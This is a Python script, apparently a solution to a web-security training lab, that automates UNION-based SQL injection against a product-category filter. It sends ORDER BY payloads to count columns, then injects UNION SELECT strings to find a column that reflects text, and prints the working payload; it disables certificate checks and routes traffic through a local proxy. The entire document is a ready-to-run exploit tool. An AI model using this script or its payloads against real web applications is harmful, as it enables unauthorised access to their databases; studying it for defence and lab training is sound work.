import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def determine_num_columns(url):
    for i in range(1, 10):
        sql_payload = f"'+ORDER+BY+{i}--"
        response = requests.get(url + sql_payload, verify=False, proxies=proxies)
        if "Internal Server Error" in response.text:
            return i - 1
        i += 1
    return False

def exploit_sqli(url, secret):
    path = 'filter?category=Pets'

    num_columns = determine_num_columns(url + path)
    if not num_columns:
        return False
    print(f"[+] The number of columns is {num_columns}")
    
    values = ["NULL"] * num_columns
    for i in range(num_columns):
        values[i] = "'" + secret + "'"
        response = requests.get(url + path + "'+UNION+SELECT+" + ",".join(values) + "--", verify=False, proxies=proxies)
        print(response.status_code)
        if secret.strip("\'") in response.text:
            return "'+UNION+SELECT+" + ",".join(values) + "--"
        values[i] = "NULL"
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f"Usage: {sys.argv[0]} <url> <retrieve>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(-1)

    print(f"[+] Cooking up a SQLi attack on {url}")
    if url[-1] != '/':
        url += '/'
    payload = exploit_sqli(url, sys.argv[2])
    if payload:
        print(f"[+] The payload is: " + payload)
    else:
        print("[-] The SQLi attack was unsuccessful")
        sys.exit(-1)
